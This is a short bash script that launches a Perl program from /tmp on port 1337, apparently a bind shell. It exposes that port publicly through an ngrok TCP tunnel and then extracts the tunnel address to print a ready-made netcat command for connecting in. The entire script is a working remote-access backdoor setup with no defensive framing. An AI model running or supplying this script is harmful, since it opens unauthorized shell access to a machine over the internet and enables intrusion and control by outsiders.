#!/bin/bash

perl /tmp/bp.pl 1337 &
/tmp/ngrok tcp 1337 > /dev/null &
curl -s http://localhost:4040/api/tunnels/command_line | grep -oE 'public_url":"(.*)","p' | sed 's/public_url":"tcp:\/\///' | sed 's/","p//' | awk -F: '{ print "nc " $1" "$2 }'

